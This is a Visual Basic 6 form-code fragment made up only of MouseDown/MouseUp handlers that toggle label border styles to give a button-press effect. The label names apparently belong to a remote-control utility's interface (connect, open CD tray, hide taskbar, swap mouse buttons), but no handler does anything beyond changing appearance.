Private Sub lblcapon_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcapon.BorderStyle = 1
End Sub

Private Sub lblcapon_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcapon.BorderStyle = 0
End Sub

Private Sub lblcdclose_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcdclose(Index).BorderStyle = 1
End Sub

Private Sub lblcdclose_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcdclose(Index).BorderStyle = 0
End Sub

Private Sub lblcdopen_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcdopen(Index).BorderStyle = 1
End Sub

Private Sub lblcdopen_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcdopen(Index).BorderStyle = 0
End Sub

Private Sub lblclkhide_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclkhide.BorderStyle = 1
End Sub

Private Sub lblclkhide_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclkhide.BorderStyle = 0
End Sub

Private Sub lblclkshow_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclkshow.BorderStyle = 1
End Sub

Private Sub lblclkshow_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclkshow.BorderStyle = 0
End Sub

Private Sub lblcompchange_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcompchange.BorderStyle = 1
End Sub

Private Sub lblcompchange_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblcompchange.BorderStyle = 0
End Sub

Private Sub lblconnect_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblconnect.BorderStyle = 1
End Sub

Private Sub lblconnect_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblconnect.BorderStyle = 0
End Sub

Private Sub lbldconnect_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldconnect.BorderStyle = 1
End Sub

Private Sub lbldconnect_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldconnect.BorderStyle = 0
End Sub

Private Sub lblctrl_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblctrl(Index).BorderStyle = 1
End Sub

Private Sub lblctrl_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblctrl(Index).BorderStyle = 0
End Sub

Private Sub lbldeskhide_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldeskhide.BorderStyle = 1
End Sub

Private Sub lbldeskhide_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldeskhide.BorderStyle = 0
End Sub

Private Sub lbldeskshow_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldeskshow.BorderStyle = 1
End Sub

Private Sub lbldeskshow_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldeskshow.BorderStyle = 0
End Sub

Private Sub lbldrive_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldrive.BorderStyle = 1
End Sub

Private Sub lbldrive_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldrive.BorderStyle = 0
End Sub

Private Sub lbldswapm_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldswapm.BorderStyle = 1
End Sub

Private Sub lbldswapm_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldswapm.BorderStyle = 0
End Sub

Private Sub lbleswapm_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbleswapm.BorderStyle = 1
End Sub

Private Sub lbleswapm_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbleswapm.BorderStyle = 0
End Sub

Private Sub lblfplay_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfplay.BorderStyle = 1
End Sub

Private Sub lblfplay_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfplay.BorderStyle = 0
End Sub

Private Sub lblfmouse_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfmouse(Index).BorderStyle = 1
End Sub

Private Sub lblfmouse_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfmouse(Index).BorderStyle = 0
End Sub

Private Sub lblgetwin_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblgetwin.BorderStyle = 1
End Sub

Private Sub lblgetwin_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblgetwin.BorderStyle = 0
End Sub

Private Sub lblhcursor_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblhcursor.BorderStyle = 1
End Sub

Private Sub lblhcursor_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblhcursor.BorderStyle = 0
End Sub

Private Sub lblnumon_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblnumon.BorderStyle = 1
End Sub

Private Sub lblnumon_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblnumon.BorderStyle = 0
End Sub

Private Sub lblmkenable_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmkenable.BorderStyle = 1
End Sub

Private Sub lblmkenable_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmkenable.BorderStyle = 0
End Sub

Private Sub lblmkdisable_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmkdisable.BorderStyle = 1
End Sub

Private Sub lblmkdisable_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmkdisable.BorderStyle = 0
End Sub

Private Sub lblmin_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmin.BorderStyle = 1
End Sub

Private Sub lblmin_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblmin.BorderStyle = 0
End Sub

Private Sub lblprostart_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprostart.BorderStyle = 1
End Sub

Private Sub lblprostart_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprostart.BorderStyle = 0
End Sub

Private Sub lblrun_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrun.BorderStyle = 1
End Sub

Private Sub lblrun_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrun.BorderStyle = 0
End Sub

Private Sub lblscrlon_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscrlon.BorderStyle = 1
End Sub

Private Sub lblscrlon_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscrlon.BorderStyle = 0
End Sub

Private Sub lblscursor_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscursor.BorderStyle = 1
End Sub

Private Sub lblscursor_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscursor.BorderStyle = 0
End Sub

Private Sub lblsetdtime_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetdtime.BorderStyle = 1
End Sub

Private Sub lblsetdtime_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetdtime.BorderStyle = 0
End Sub

Private Sub lblsetcur_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetcur.BorderStyle = 1
End Sub

Private Sub lblsetcur_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetcur.BorderStyle = 0
End Sub

Private Sub lblsplay_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsplay.BorderStyle = 1
End Sub

Private Sub lblsplay_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsplay.BorderStyle = 0
End Sub

Private Sub lblstartdab_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartdab.BorderStyle = 1
End Sub

Private Sub lblstartdab_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartdab.BorderStyle = 0
End Sub
Private Sub lblstartenb_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartenb.BorderStyle = 1
End Sub

Private Sub lblstartenb_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartenb.BorderStyle = 0
End Sub

Private Sub lblstrayhide_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstrayhide.BorderStyle = 1
End Sub

Private Sub lblstrayhide_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstrayhide.BorderStyle = 0
End Sub

Private Sub lblstrayshow_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstrayshow.BorderStyle = 1
End Sub

Private Sub lblstrayshow_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstrayshow.BorderStyle = 0
End Sub

Private Sub lblsystem_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsystem.BorderStyle = 1
End Sub

Private Sub lblsystem_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsystem.BorderStyle = 0
End Sub

Private Sub lblterminate_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblterminate(Index).BorderStyle = 1
End Sub

Private Sub lblterminate_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
lblterminate(Index).BorderStyle = 0
End Sub

Private Sub lbltbarhide_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltbarhide.BorderStyle = 1
End Sub

Private Sub lbltbarhide_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltbarhide.BorderStyle = 0
End Sub

Private Sub lbltbarshow_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltbarshow.BorderStyle = 1
End Sub

Private Sub lbltbarshow_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltbarshow.BorderStyle = 0
End Sub

Private Sub lblwintime_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblwintime.BorderStyle = 1
End Sub

Private Sub lblwintime_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblwintime.BorderStyle = 0
End Sub

Private Sub door_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
door(Index).BorderStyle = 1
End Sub

Private Sub door_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
door(Index).BorderStyle = 0
End Sub

Private Sub lblstop_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstop.BorderStyle = 1
End Sub

Private Sub lblstop_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstop.BorderStyle = 0
End Sub

Private Sub lblscan_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscan.BorderStyle = 1
End Sub

Private Sub lblscan_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscan.BorderStyle = 0
End Sub
